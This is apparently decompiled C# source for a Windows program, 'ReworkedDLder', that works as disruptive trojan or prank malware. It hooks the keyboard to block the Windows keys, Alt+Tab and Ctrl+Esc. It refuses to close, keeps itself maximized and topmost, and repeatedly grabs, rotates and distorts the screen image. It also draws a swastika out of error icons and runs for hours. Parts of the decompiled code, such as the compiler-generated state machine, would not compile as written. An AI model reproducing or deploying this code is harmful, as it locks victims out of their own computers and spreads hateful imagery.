using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Whirl;

namespace ReworkedDLder
{
	// Token: 0x02000005 RID: 5
	public partial class Form1 : Form
	{
		// Token: 0x0600000B RID: 11
		[DllImport("gdi32.dll")]
		public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjSource, int nXSrc, int nYSrc, uint dwRop);

		// Token: 0x0600000C RID: 12
		[DllImport("GDI32.DLL", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
		public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nDestWidth, int nDestHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nSrcWidth, int nSrcHeight, int dwRop);

		// Token: 0x0600000D RID: 13
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x0600000E RID: 14
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x0600000F RID: 15
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000010 RID: 16 RVA: 0x00002128 File Offset: 0x00000328
		public Form1(string[] args)
		{
			this.InitializeComponent();
			try
			{
				int num = int.Parse(args[0]);
				this.debug = (num % 2 == 1);
				num >>= 1;
				this.key = (num % 2 == 1);
				num >>= 1;
				this.clickthrough = (num % 2 == 1);
			}
			catch (Exception)
			{
			}
			if (!this.key)
			{
				ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
				this.objKeyboardProcess = new Form1.LowLevelKeyboardProc(this.captureKey);
				this.ptrHook = Form1.SetWindowsHookEx(13, this.objKeyboardProcess, Form1.GetModuleHandle(mainModule.ModuleName), 0U);
			}
			base.TopMost = !this.debug;
			bool flag = this.debug;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_KeyDown(object sender, KeyEventArgs e)
		{
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_MouseMove(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002208 File Offset: 0x00000408
		private Point poscal(Bitmap b)
		{
			return new Point(b.Size.Width / 2, b.Size.Height / 2);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x0000223C File Offset: 0x0000043C
		private void ShiftPixels(Bitmap bp, int stepSize)
		{
			int num = new Random().Next(0, bp.Width - 50);
			bp.GetPixel(0, 0);
			for (int i = num; i < num + 50; i++)
			{
				for (int j = bp.Height - 1; j > 0; j--)
				{
					if (j - stepSize < 0)
					{
						bp.SetPixel(i, j, bp.GetPixel(i, 0));
					}
					else
					{
						bp.SetPixel(i, j, bp.GetPixel(i, j - stepSize));
					}
				}
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000022B4 File Offset: 0x000004B4
		private async void Form1_Load(object sender, EventArgs e)
		{
			Rectangle w = Screen.FromControl(this).Bounds;
			if (!this.clickthrough)
			{
				this.BackColor = Color.FromArgb(255, 1, 0, 0);
				base.TransparencyKey = Color.FromArgb(255, 1, 0, 0);
			}
			else
			{
				this.BackColor = Color.FromArgb(255, 0, 0, 0);
				base.TransparencyKey = Color.FromArgb(255, 0, 0, 0);
			}
			new Point(0, 0);
			Bitmap ee = new Bitmap(SystemIcons.Shield.ToBitmap());
			Bitmap bitmap = new Bitmap(SystemIcons.Error.ToBitmap());
			Bitmap gg = new Bitmap(SystemIcons.Warning.ToBitmap());
			new Bitmap(SystemIcons.Information.ToBitmap());
			Graphics g = base.CreateGraphics();
			base.CreateGraphics();
			Stuff.Note[] tune = new Stuff.Note[0];
			new SolidBrush(Color.Black);
			this.okthx(106666600, 1, w, 1);
			this.pleasedont(w);
			this.Swastika(g, new Point(w.Width / 2, w.Height / 2), w, bitmap, bitmap.Width, 320, 320);
			Stuff.Play(tune);
			for (int xd = 0; xd < 66666666; xd++)
			{
				this.cursor(1, g, gg);
				g.DrawImage(ee, this.rnd.Next(0, w.Width) - this.poscal(ee).X, this.rnd.Next(0, w.Height) - this.poscal(ee).Y);
				await Task.Delay(10);
			}
			await Task.Delay(55555000);
			base.Dispose();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000022F0 File Offset: 0x000004F0
		private async Task<bool> okthx(int ang, int a, Rectangle w, int delay = 10)
		{
			int t = 0;
			int pls = 0;
			while (pls < ang)
			{
				int num = pls;
				pls = num + 1;
				IntPtr dc = Form1.GetDC(IntPtr.Zero);
				Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppPArgb);
				Graphics g = Graphics.FromImage(bmpScreenshot);
				Bitmap image = new Bitmap(w.Width, w.Height);
				Graphics graphics = Graphics.FromImage(image);
				g.FillRectangle(Brushes.White, 0, 0, bmpScreenshot.Width * 3, bmpScreenshot.Height * 3);
				float num2 = 0.99f;
				int scaleWidth = (int)((float)bmpScreenshot.Width * num2);
				int scaleHeight = (int)((float)bmpScreenshot.Height * num2);
				g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, new Size(w.Width, w.Height), CopyPixelOperation.SourceCopy);
				g = Graphics.FromHdc(dc);
				if (t < 360 / a)
				{
					for (int i = 0; i < 4; i++)
					{
						this.ShiftPixels(bmpScreenshot, this.rnd.Next(1, 25));
					}
					g.TranslateTransform((float)(scaleWidth / 2), (float)(scaleHeight / 2));
					g.RotateTransform((float)(t * a));
					g.TranslateTransform((float)(-(float)scaleWidth / 2), (float)(-(float)scaleHeight / 2));
					graphics.DrawImage(image, 0, 0);
					await Task.Delay(10);
					g.DrawImage(bmpScreenshot, 0 - (scaleWidth - bmpScreenshot.Width) / 2, -(scaleHeight - bmpScreenshot.Height) / 2, scaleWidth, scaleHeight);
				}
				else
				{
					t = 0;
				}
				num = t;
				t = num + 1;
				await Task.Delay(delay);
				GC.Collect();
				GC.WaitForPendingFinalizers();
				bmpScreenshot = null;
				g = null;
			}
			return true;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002358 File Offset: 0x00000558
		private static Graphics CaptureScreen(Screen window)
		{
			Graphics result;
			try
			{
				Rectangle bounds = window.Bounds;
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
						result = graphics;
					}
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000023E8 File Offset: 0x000005E8
		private Task<bool> pleasedont(Rectangle w)
		{

			Form1.<pleasedont>d__20 <pleasedont>d__;
			<pleasedont>d__.w = w;
			<pleasedont>d__.<>t__builder = AsyncTaskMethodBuilder<bool>.Create();
			<pleasedont>d__.<>1__state = -1;
			AsyncTaskMethodBuilder<bool> <>t__builder = <pleasedont>d__.<>t__builder;
			<>t__builder.Start<Form1.<pleasedont>d__20>(ref <pleasedont>d__);
			return <pleasedont>d__.<>t__builder.Task;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002430 File Offset: 0x00000630
		public async Task<Point> ExpressionBitmapDrawing(Rectangle rect, Graphics g, Bitmap bmp, int input, int space, int delay)
		{
			Point drawpos = new Point(0, 0);
			for (int i = 0; i <= rect.Width; i += space)
			{
				g.DrawImage(bmp, (float)i, (float)rect.Height / 2f - 1f * Convert.ToSingle(Math.Sin((double)i)) * Convert.ToSingle(rect.Height));
				await Task.Delay(delay);
			}
			return drawpos;
		}

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600001A RID: 26 RVA: 0x00002497 File Offset: 0x00000697
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 128;
				return createParams;
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000024B4 File Offset: 0x000006B4
		public async Task<bool> Swastika(Graphics g, Point pos, Rectangle w, Bitmap ff, int moveBy, int wi, int he)
		{
			int direction = 0;
			int i = 0;
			Point lastposition = new Point(Math.Abs(pos.X), Math.Abs(pos.Y));
			for (;;)
			{
				Console.WriteLine(lastposition);
				int num;
				switch (direction)
				{
				case 0:
					if (lastposition.Y < pos.Y + he / 2)
					{
						lastposition.Y += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
					}
					break;
				case 1:
					if (lastposition.X < pos.X + wi)
					{
						lastposition.X += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
					}
					break;
				case 2:
					if (lastposition.Y < pos.Y + he)
					{
						lastposition.Y += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
						lastposition.X = pos.X + wi / 2;
						lastposition.Y = pos.Y;
					}
					break;
				case 3:
					if (lastposition.Y < pos.Y + he)
					{
						lastposition.Y += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
					}
					break;
				case 4:
					if (lastposition.Y < pos.Y + he)
					{
						lastposition.Y += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
						lastposition.X = pos.X + wi / 2;
						lastposition.Y = pos.Y;
					}
					break;
				case 5:
					if (lastposition.X < pos.X + wi)
					{
						lastposition.X += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
						lastposition.X = pos.X;
						lastposition.Y = pos.Y + he;
					}
					break;
				case 6:
					if (lastposition.X < pos.X + wi / 2)
					{
						lastposition.X += moveBy;
					}
					else
					{
						num = direction;
						direction = num + 1;
						lastposition.X = pos.X;
						lastposition.Y = pos.Y;
					}
					break;
				default:
					direction = -1;
					break;
				}
				num = i;
				i = num + 1;
				await Task.Delay(0);
				if (direction == -1)
				{
					break;
				}
				g.DrawImage(ff, lastposition.X - wi / 2 - this.poscal(ff).X, lastposition.Y - he / 2 - this.poscal(ff).Y);
			}
			return true;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002530 File Offset: 0x00000730
		public async Task<bool> cursor(int x, Graphics g, Bitmap ee)
		{
			g = base.CreateGraphics();
			g.DrawImage(ee, Control.MousePosition.X - this.poscal(ee).X, Control.MousePosition.Y - this.poscal(ee).Y);
			await Task.Delay(x);
			return true;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000258D File Offset: 0x0000078D
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002596 File Offset: 0x00000796
		private void Form1_Resize(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_MouseUp(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002204 File Offset: 0x00000404
		private void Form1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000023 RID: 35
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int id, Form1.LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

		// Token: 0x06000024 RID: 36
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool UnhookWindowsHookEx(IntPtr hook);

		// Token: 0x06000025 RID: 37
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

		// Token: 0x06000026 RID: 38
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string name);

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern short GetAsyncKeyState(Keys key);

		// Token: 0x06000028 RID: 40 RVA: 0x000025A0 File Offset: 0x000007A0
		private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
		{
			if (nCode >= 0)
			{
				Form1.KBDLLHOOKSTRUCT kbdllhookstruct = (Form1.KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(Form1.KBDLLHOOKSTRUCT));
				if (kbdllhookstruct.key == Keys.RWin || kbdllhookstruct.key == Keys.LWin || (kbdllhookstruct.key == Keys.Tab && this.HasAltModifier(kbdllhookstruct.flags)) || (kbdllhookstruct.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control))
				{
					return (IntPtr)1;
				}
			}
			return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002624 File Offset: 0x00000824
		private bool HasAltModifier(int flags)
		{
			return (flags & 32) == 32;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002596 File Offset: 0x00000796
		private void Form1_SizeChanged(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002204 File Offset: 0x00000404
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x04000006 RID: 6
		private bool debug;

		// Token: 0x04000007 RID: 7
		private bool key = true;

		// Token: 0x04000008 RID: 8
		private bool clickthrough;

		// Token: 0x04000009 RID: 9
		private Point pos = new Point(0, 0);

		// Token: 0x0400000A RID: 10
		private float width;

		// Token: 0x0400000B RID: 11
		private float height;

		// Token: 0x0400000C RID: 12
		private Random rnd = new Random();

		// Token: 0x0400000D RID: 13
		private IntPtr ptrHook;

		// Token: 0x0400000E RID: 14
		private Form1.LowLevelKeyboardProc objKeyboardProcess;

		// Token: 0x0200000B RID: 11
		// (Invoke) Token: 0x06000038 RID: 56
		private delegate double del(double i);

		// Token: 0x0200000C RID: 12
		private struct KBDLLHOOKSTRUCT
		{
			// Token: 0x04000043 RID: 67
			public Keys key;

			// Token: 0x04000044 RID: 68
			public int scanCode;

			// Token: 0x04000045 RID: 69
			public int flags;

			// Token: 0x04000046 RID: 70
			public int time;

			// Token: 0x04000047 RID: 71
			public IntPtr extra;
		}

		// Token: 0x0200000D RID: 13
		// (Invoke) Token: 0x0600003C RID: 60
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
